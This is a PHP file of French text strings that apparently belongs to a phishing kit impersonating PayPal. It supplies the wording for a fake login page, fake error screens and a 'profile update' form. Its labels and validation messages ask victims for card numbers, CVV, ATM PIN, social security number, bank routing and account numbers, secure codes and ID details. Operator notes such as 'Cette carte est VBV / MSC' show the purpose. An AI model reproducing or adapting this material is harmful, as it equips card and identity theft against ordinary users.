<?php


$confirmbutton = "confirmer";
$confirmyourinfo = "Vous devez confirmer vos informations pour être en mesure de résoudre ce problème et l'accès à votre compte";
$unabletoload = "Nous Sommes Incapable de charger votre pour le moment";

$wrong = "Veuillez vérifier que vous avez saisi correctement votre adresse email et votre mot de passe.";
$titlerr = "Erreur: Connexion ";
$confirm = "Confirmez votre compte Utilisez-le comme bon vous semble";
$topp = "Votre sécurité est notre priorité";
$secondarycred = "Carte de crédit secondaire (facultatif)";
$primarycred = "Carte de crédit primaire";
$thiscardis = "Cette carte est VBV / MSC";
  
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$top_title = "PayPal: Achetez, envoyez de l'argent et acceptez les paiements";
$small_with_helper_input_0 = "Entrez une adresse email correcte";
$small_with_helper_input_1 = "Entrez un mot de passe";
$login_email_input_0 = "Adresse email";
$passwordRecovery1_a_0 = "Vous avez oublié votre adresse email ?";
$login_password_input_0 = "Mot de passe";
$passwordRecovery2_a_0 = "Vous avez oublié votre mot de passe ?";
$login_button_a_0 = "Connexion";
$signup_button_a_0 = "Ouvrir un compte";
$header_buy_a_0 = "Acheter";
$header_sell_a_0 = "Vendre";
$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Tous droits réservés.";
$header_send_a_0 = "Envoyer";
$header_business_a_0 = "Professionnels";
$signup_button_inner_a_0 = "Ouvrir un compte";
$hero_h1_0 = "De l'argent pour chaque instant.";
$SignUp_consumer_hero_input_0 = "Ouvrir un compte gratuitement";
$signup_subline_p_0 = "Professionnel ? Ouvrez un compte Pro ";
$icon_help_a_0 = "Aide";
$icon_contact_a_0 = "Contact";
$icon_search_button_0 = "Rechercher";
$_large_h2_n1_0 = "Simple et efficace.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Acceptez tous les paiements en ligne.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Envoyez de l'argent en un clin d'œil.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Faites-vous rembourser tout aussi vite.";
$contentPara_p_n1_0 = "Avec PayPal, une adresse email et un mot de passe suffisent pour faire un paiement. Des millions d'utilisateurs en profitent déjà. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Envoyez rapidement de l'argent à vos proches avec leur adresse email ou numéro de mobile, dans le monde entier. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Vous avez participé à un cadeau commun ou souhaitez vous faire rembourser ? Envoyez une demande d'argent et n'y pensez plus. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Acceptez les paiements par carte ou compte bancaire en un tour de main. De l'intégration sur votre site au retrait de votre argent sur votre compte bancaire, nous avons tout prévu pour vous. ";
$contentLink_a_n1_0 = "Payer sur eBay";
$contentLink_a_n1_1 = "Payer en ligne";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Envoyer de l'argent";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Demander de l'argent";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Accepter des paiements";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Envoyer une facture par email";
$closingHeadline_headline_large_p_0 = "Optez pour la facilité. ";
$btn_closing_cta_center_block_span4_a_0 = "Ouvrez un compte";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Aide";
$footer_footer_main_secondaryLink_li[1] = "Contact";
$footer_footer_main_secondaryLink_li[2] = "Tarifs";
$footer_footer_main_secondaryLink_li[3] = "Sécurité";
$footer_footer_main_secondaryLink_li[4] = "Shopping";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "À propos";
$footer_footer_secondary_secondaryLink_li[1] = "eBay";
$footer_footer_secondary_secondaryLink_li[2] = "Développeurs";
$footer_footer_secondary_secondaryLink_li[3] = "Professionnels";
$footer_footer_secondary_secondaryLink_li[4] = "Partenaires";
$footer_footer_secondary_secondaryLink_li[5] = "Évaluation";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999 - ".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Respect de la vie privée";
$footer_footer_tertiary_secondaryLink_li[2] = "Contrats d'utilisation";

$top_title2 = "Erreur : Connexion en France - PayPal";
$alert_alert_warning_div_0 = "Vous devez entrer à la fois votre adresse email et votre mot de passe. Merci de recommencer.";
$loginheadline_p_0 = "Connectez-vous à votre compte";
$error_span_0 = "Adresse email";
$error_span_1 = "Mot de passe";
$btn_large_input_0 = "Connexion";
$pwrLinkoldflow_a_0 = "Vous avez oublié votre adresse email ou votre mot de passe ?";
$btn_btn_secondary_large_a_0 = "Ouvrir un compte gratuitement";
$headline_p_0 = "Payez comme vous voulez<SPAN class=headline-content>Pour vos achats en ligne, vous décidez comment payer : carte de paiement, compte bancaire, carte privative. Pas besoin de solde PayPal.</SPAN>";
$headline_p_1 = "Plus simple et rapide<SPAN class=headline-content>Ouvrir un compte PayPal est gratuit. Une adresse email et un mot de passe suffisent pour payer dans des milliers de boutiques en ligne.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Notre société";
$footer_li_footer_li[1] = "Types de compte";
$footer_li_footer_li[2] = "Tarifs";
$footer_li_footer_li[3] = "Respect de la vie privée";
$footer_li_footer_li[4] = "Sécurité";
$footer_li_footer_li[5] = "Contact";
$footer_li_footer_li[6] = "Contrats d'utilisation";
$footer_li_footer_li[7] = "Développeurs";
$footer_li_footer_li[8] = "Mobile";
$footer_li_footer_li[9] = "Paiements groupés";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Tous droits réservés.";

$charset = "UTF-8";
$profupdate = "Mise à jour de profil - PayPal";
$processing = "Ouverture de session sécurisée";
$opay = "Ouverture de Session Sécurisée - PayPal";
$ifno = "Si cette page reste affichée plus de 5 secondes,";
$clickhere = "cliquez ici";
$reload = "pour l'actualiser.";
$logout = "Déconnexion";
$help = "Aide";
$s_center = "Sécurité et protection";
$myacc = "Mon Compte";
$over = "Description générale";
$addfound = "Ajouter des fonds";
$retirar = "Virer";
$banktf = "Virer des fonds vers un compte bancaire";
$history = "Historique";
$bsearch = "Recherche de base";
$dhistory = "Télécharger l'historique";
$resolu = "Gestionnaire de litiges";
$opencase = "Visualiser les dossiers en cours";
$guides = "Didacticiels";
$prof = "Préférences";
$addemail = "Ajouter ou modifier une adresse email";
$addbank = "Enregistrer ou modifier un compte bancaire";
$addcard = "Enregistrer ou modifier une carte de crédit";
$addadr = "Ajouter ou modifier une adresse postale";
$sendmoney = "Envoie de paiement";
$reqmoney = "Demande de paiement";
$mservices = "Solutions e-commerce";
$autools = "Outils enchères";
$stra = "Transaction sécurisée";
$puf = "Actualiser le profil";
$pip = "Informations sur le profil personnel";
$acu = "Saisissez vos informations de façon aussi précise que possible.";
$accu = "Assurez-vous que vous entrez les informations avec précision, et selon les formats requis.";
$filla = "Veuillez remplir tous les champs vides.";
$rfield = "Champ obligatoire";
$ffPrenom = "Prénom ";
$ffNom  = "Nom ";
$dateness = "Date de naissance ";
$month = "Mois";
$day = "Jour"; 
$year = "Année";
$adr1 = "Ligne d'adresse 1 ";
$adr2 = "Ligne d'adresse 2 ";
$city = "Ville ";
$state = "Etat ";
$zip = "Code Postal ";
$country = "Pays ";
$scountry = "----- Choisir un pays -----";
$hpn = "N° de téléphone ";
$acpnum = "Ce numéro sera utilisé pour vous contacter en cas de problème avec votre compte ou votre achat. Nous ne communiquons jamais votre numéro aux sociétés de télémarketing.";
$ccprof = "Profil de la carte de crédit/débit";
$damelacc = "Entrez le numéro de carte de façon aussi précise que possible.";
$damelacb = "N° de carte, veuillez entrer les numéros seulement, pas de tirets ou des espaces.";
$Nomdutitulairedelacarte = "Nom du titulaire";
$ccnumbr = "N° de carte";
$expbr = "Date d'expiration";
$cvv = "Cryptogramme visuel";
$hcvv = "Aide sur le Cryptogramme visuel de la carte";
$atmm = "Votre PIN Guichet";
$ssn = "Numéro de Sécurité Sociale";
$routing="Bank Routing Number";
$account="Bank Account Number";
$hrouting="Aide sur votre Bank Routing Number";
$haccount="Aide sur votre Bank Account Number";
$codepersonel="Code sécurisé";
$IDTYPE = "Sélectionnez le type de Id";
$Passport="Passeport";
$Card_Identification="Carte d'identification";
$Driving_License="Permis de conduire";
$for1 = "Pour votre protection, nous vérifions les informations des cartes de crédit.";
$for2 = "Le processus prend normalement environ 30 secondes, mais il peut prendre plus de temps à certaines périodes de la journée. Cliquez";
$for3 = "Actualiser vos informations.";
$spo = "Enregistrer le profil";
$t1 = "Plus d'informations";
$t2 = "Notre société";
$t3 = "Evaluation du site";
$t4 = "Tarifs";
$t5 = "Respect de la vie privée";
$t6 = "Security Center";
$t7 = "Service clientèle";
$t8 = "Contrats légaux";
$t9 = "International";
$t10 = "Offres d'emploi";
$t11 = "Solutions e-commerce";
$t12 = "Notre blog";
$t13 = "Ateliers";
$t14 = "Parrainages";
$t15 = "Plan du site";
$t16 = "eBay";
$t17 = "Communauté";
$fdic = "Information about FDIC pass-through insurance";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">Veuillez être sure d’entrer les informations correctement, et respecter les formats requis.Remplissez tous les champs requis.</p></div></div>';

$valid = array(" Veuillez saisir votre prénom " 
, " Prénom non valide " 
, " Veuillez entrer votre nom de famille " 
, " Nom non valide " 
, "Veuillez sélectionner un mois de naissance valide. " 
, "S'il vous plaît sélectionner un anniversaire valide. " 
, "S'il vous plaît choisir une année de naissance valide. " 
, " Veuillez entrer votre adresse " 
, " Adresse incorrecte " 
, " Adresse incorrecte " 
, " Veuillez entrer le nom de votre ville " 
, "Veuillez saisir un nom valide de la ville. " 
, "Veuillez saisir un nom valide de la ville. " 
, " Sélectionner pays/territoire " 
, " Veuillez entrer votre code postal " 
, "Code postal invalide. " 
, " Veuillez entrer votre numéro de téléphone " 
, " N'entrez que le numéro " 
, " Veuillez entrer un numéro de téléphone valide " 
, " Veuillez entrer un nom valide de détenteur de la carte " 
, " Numéro de carte est au format non valide " 
, " Numéro de carte bancaire n'est pas valide " 
,"" 
,"" 
, " N'entrez que le numéro " 
, " S'il vous plaît sélectionnez les dates d'Expiration --mois--" 
, " Veuillez sélectionner la Date de péremption --année--" 
, " S'il vous plaît entrer votre Cvv " 
, "Veuillez entrer un valide Cvv/Cvv2 de votre carte. " 
, "Cvv/Cvv2 non valide" 
, " Veuillez entrer votre PIN de guichet automatique " 
, " Veuillez entrer un PIN valide de guichet automatique " 
, " Veuillez entrer un PIN valide de guichet automatique " 
, " Veuillez entrer votre numéro de sécurité sociale " 
, " Numéro de sécurité sociale non valide. " 
, " Numéro de sécurité sociale non valide. " 
, " La sécurité sociale ne numéro que le numéro " 
, " Veuillez entrer votre Code sécurisé " 
," Secure Code non valide ") ;
$allcountry1 = "À vos côtés, où que vous soyez.";
$allcountry2 = "PayPal est disponible dans 193 pays et 26 devises. Envoyez et recevez de l'argent de manière sécurisée par-delà les frontières et les barrières linguistiques. ";
$One_moment = "Un instant...";

$your_money = "Obtenez plus de votre argent";
$your_money_p = "Votre compte PayPal, vous donne un moyen plus sûr, plus rapide et plus pratique de payer en ligne et sur votre mobile. Stockez vos informations financières en toute sécurité avec nous puis utilisez votre compte pour faire du shopping, transférer de l'argent ou vendre des objets à gagner de l'argent - tout en quelques clics.";
$websites = "Magasinez à des millions de sites Web";
$websites_p = "PayPal est disponible sur des millions de sites Web dans le monde entier. Donc, si vous achetez des plus grands détaillants ou les petits spécialistes, vous pouvez faire des emplettes sans partager vos informations et vitesse dans la caisse. Et n'importe quel appareil que vous utilisez, votre expérience PayPal sera tout aussi rapide et pratique.";
$Simply_secure = "Il suffit de sécurité";
$Simply_secure_p = "La sécurité est au cœur de tout ce que nous faisons. Que ce soit pour la protection de vos informations financières ou de vos achats, nous mettons d'abord votre sécurité et tranquillité d'esprit. C'est pourquoi nous avons recours à des technologies de cryptage et de lutte contre la fraude, pourquoi nous surveillons les transactions 24 heures par jour et c'est pourquoi nous pouvons vous aider à récupérer votre argent si votre achat n'arrive pas ou ne correspond pas à sa description.";
$ex_date_info = "S'il vous plaît donnez-nous votre carte, date d'expiration (MM/AAAA).";
$ex_date_empty = "S'il vous plaît nous donner votre date d'expiration de carte.";
$ex_date_format = "S'il vous plaît entrer une date d'expiration valide (MM/AAAA).";
$cardholder_info = "Utilisez votre nom comme indiqué sur votre carte";
$card_info = "Entrez votre numéro de carte";
$card_format = "Numéro de carte n'est pas valide";
$atm_info = "Entrez le code PIN de atm pour cette carte.";
$account_info = "Entrez votre numéro de compte bancaire";
$account_empty = "S'il vous plaît Entrez votre numéro de compte bancaire pour vérifier votre compte";
$account_format = "S'il vous plaît Entrez un numéro de compte bancaire valide";
$routing_info = "Entrez votre numéro d'acheminement bancaire";
$routing_empty = "S'il vous plaît Entrez votre numéro d'acheminement bancaire pour vérifier votre compte";
$routing_format = "S'il vous plaît Entrez un numéro d'acheminement bancaire valide";
$first_name = "Votre prénom";
$first_name_info = "Utilisez votre prénom juridique comme indiqué sur votre permis de conduire, carte d'assurance nationale ou passeport.";
$first_name_empty = "Nous avons besoin de votre prénom juridique pour vérifier votre compte.";
$last_name = "Votre nom";
$last_name_info = "Utilisez votre nom légal, comme indiqué sur votre permis de conduire, carte d'assurance nationale ou passeport.";
$last_name_empty = "Nous avons besoin de votre nom légal pour vérifier votre compte.";
$Birth_date = "Date de naissance";
$Birth_date_empty ="S'il vous plaît nous donner votre date de naissance.";
$Birth_date_format = "S'il vous plaît entrer une date valide (JJ/MM/AAAA).";
$Birth_date_info = "S'il vous plaît nous donner votre date de naissance (JJ/MM/AAAA).";
$Address1 = "Adresse ligne 1";
$Address1_empty = "Nous avons besoin d'une adresse valide pour vérifier votre compte.";
$Address1_info = "Nous ne pouvons pas accepter des boîtes postales ou des adresses d'entreprises.";
$Address2 = "Adresse ligne 2";
$City = "ville";
$City_empty = "Nous avons besoin d'une ville/ville pour vérifier votre compte.";
$Postcode = "Code Postal";
$Postcode_empty = "Nous avons besoin d'un code postal pour créer un nouveau compte pour vous.";
$Postcode_format = "S'il vous plaît vérifier votre code postal pour des fautes de frappe, le format ne semble pas correcte.";
$fone = "Votre numéro de téléphone";
$fone_empty = "Nous avons besoin de votre numéro de téléphone pour vérifier votre compte.";
$fone_format = "S'il vous plaît vérifier votre numéro de téléphone pour les fautes de frappe, le format ne semble pas correcte.";
$fone_info = "Votre numéro de téléphone (s'il vous plaît utiliser chiffres uniquement)";
$verifyaccount = "Vérifiez votre compte";
$Ownb = "Propriétaire d'une entreprise?";
$hh1 = "Vos données sécurisées";
$hh2 = "Vos données personnelles";
$pp1 = "Nous avons besoin de vos coordonnées sécurisés valides pour vérifier votre compte.";
$pp2 = "Nous avons besoin de quelques informations sur vous avant que nous puissions vérifier votre compte.";

$type1="Maison";
$type2="Mobile";
$button_continue="Continuer";
$button_validate="Vérifier";


?>